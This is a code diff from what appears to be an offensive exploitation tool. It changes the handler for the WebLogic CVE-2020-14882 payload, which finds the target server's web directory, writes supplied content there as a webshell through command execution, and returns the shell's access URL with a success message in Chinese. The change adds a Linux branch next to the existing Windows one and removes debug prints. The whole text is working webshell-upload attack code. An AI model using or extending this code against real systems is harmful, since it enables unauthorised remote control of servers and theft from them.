@@ -39,20 +39,24 @@ class rocUploadFileController(object):
         print(filepathAll)
 
         if payload == "CVE-2020-14882_weblogic_12_1_3":
-            print(123123)
-            basePath = rocUploadFileController.runGetBasePath(self, targetAddr, payload, command=windows_path_cmd)
-            print(basePath)
-            print(321321)
-            getShellPath = basePath['data'].strip() + basePath['win_whrite_path'] + filepath
-            print(getShellPath)
-            whriteShellData = r"echo {} > {}".format(content, getShellPath)
-            whriteShellData = "/".join(whriteShellData.split("\\"))
-            print(whriteShellData)
-            rocUploadFileController.CVE_2020_14882_weblogic_getwebshell(self, targetAddr, whriteShellData, payload)
-            webshell_path = targetAddr + basePath['access_path'] + filepath
-            getShellPath = "/".join(whriteShellData.split("\\"))
-            command_data = "webshell上传成功! 访问地址:{} 绝对地址:{} {}".format(webshell_path, getShellPath, currentTime)
-            return {'status': 20000, 'data': command_data, 'type': 'status'}
+            if ':\Windows' not in filepathAll:
+                basePath = rocUploadFileController.runGetBasePath(self, targetAddr, payload, command=linux_path_cmd)
+                getShellPath = basePath['data'].strip() + basePath['whrite_path'] + filepath
+                whriteShellData = "echo {} > {}".format(content, getShellPath)
+                whriteShell = rocUploadFileController.runGetBasePath(self, targetAddr, payload, command=whriteShellData)
+                webshell_path = targetAddr + basePath['access_path'] + filepath
+                command_data = "webshell上传成功! 访问地址:{} 绝对地址:{} {}".format(webshell_path, getShellPath, currentTime)
+                return {'status': 20000, 'data': command_data, 'type': 'status'}
+            else:
+                basePath = rocUploadFileController.runGetBasePath(self, targetAddr, payload, command=windows_path_cmd)
+                getShellPath = basePath['data'].strip() + basePath['win_whrite_path'] + filepath
+                whriteShellData = r"echo {} > {}".format(content, getShellPath)
+                whriteShellData = "/".join(whriteShellData.split("\\"))
+                rocUploadFileController.CVE_2020_14882_weblogic_getwebshell(self, targetAddr, whriteShellData, payload)
+                webshell_path = targetAddr + basePath['access_path'] + filepath
+                getShellPath = "/".join(whriteShellData.split("\\"))
+                command_data = "webshell上传成功! 访问地址:{} 绝对地址:{} {}".format(webshell_path, getShellPath, currentTime)
+                return {'status': 20000, 'data': command_data, 'type': 'status'}
         else:
             if ':\Windows' not in filepathAll:
                 basePath = rocUploadFileController.runGetBasePath(self, targetAddr, payload, command=linux_path_cmd)
